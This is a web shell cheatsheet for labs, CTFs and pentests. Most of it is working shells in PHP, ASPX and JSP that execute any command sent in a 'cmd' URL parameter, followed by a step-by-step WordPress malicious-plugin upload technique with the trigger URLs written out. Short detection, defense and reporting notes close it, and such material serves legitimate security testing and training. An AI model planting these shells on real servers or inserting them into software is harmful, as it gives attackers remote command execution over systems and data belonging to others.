# Web Shell Cheatsheet

> For use in authorized labs, CTFs, and pentests only. Uploading a web shell to a system you don't own or don't have written authorization to test is illegal.

A web shell is a small script used, in an authorized engagement, to validate that an unrestricted file upload or remote code execution vulnerability is actually exploitable, so it can be reported and fixed.

## Minimal PHP web shell

```php
<?php system($_GET['cmd']); ?>
```

Usage in an authorized test: `http://TARGET/uploaded.php?cmd=id`

## Minimal ASPX web shell

```aspx
<%@ Page Language="C#" %>
<%
System.Diagnostics.Process p = new System.Diagnostics.Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + Request.QueryString["cmd"];
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.Start();
Response.Write(p.StandardOutput.ReadToEnd());
%>
```

## Minimal JSP web shell

```jsp
<%@ page import="java.io.*" %>
<% String cmd = request.getParameter("cmd");
   Process p = Runtime.getRuntime().exec(cmd);
   BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
   String line; while((line = br.readLine()) != null) { out.println(line); }
%>
```

## WordPress plugin shell (zip-upload technique)

Some WordPress installs allow an authenticated admin (or a low-priv user with plugin-install rights) to upload a plugin as a `.zip`. If so, a plugin containing a PHP shell will execute once activated. This is a common path on practice VMs like DeathNote.

**1. Create the plugin folder and file:**

```bash
mkdir shell-plugin
cat > shell-plugin/shell-plugin.php << 'EOF'
<?php
/*
Plugin Name: Shell Plugin
*/
system($_GET['cmd']);
?>
EOF
```

**2. Package it as a zip (required format for the WP plugin uploader):**

```bash
zip -r shell-plugin.zip shell-plugin
```

**3. Upload via wp-admin:**

`Plugins → Add New → Upload Plugin → shell-plugin.zip → Install Now → Activate`

**4. Trigger it:**

Once activated, the plugin file is placed under `wp-content/plugins/shell-plugin/shell-plugin.php` and is reachable directly:

```
http://TARGET/wp-content/plugins/shell-plugin/shell-plugin.php?cmd=id
```

> Note: this requires valid WordPress admin/plugin-upload credentials — it's a post-authentication technique, not a way to bypass login. Common precondition on labs: weak/reused creds discovered during enumeration.

## Detection / defense notes

- File upload validation should check content, not just extension (magic bytes, MIME type, image re-encoding).
- Store uploads outside the webroot, or disable script execution in the upload directory.
- Web Application Firewalls and file-integrity monitoring (e.g. Tripwire, OSSEC) can catch dropped shells.
- Log and alert on new `.php`/`.aspx`/`.jsp` files appearing in web-accessible directories.
- For WordPress specifically: restrict plugin install/upload capability to trusted admins only, enable file-integrity monitoring on `wp-content/plugins/`, and consider disabling the plugin/theme editor and file uploads via `DISALLOW_FILE_EDIT` / `DISALLOW_FILE_MODS` in `wp-config.php`.

## Reporting

When used during an authorized assessment, document: upload vector, resulting shell path, commands run to demonstrate impact, and a remediation recommendation — then remove the shell after the engagement per your rules of engagement.
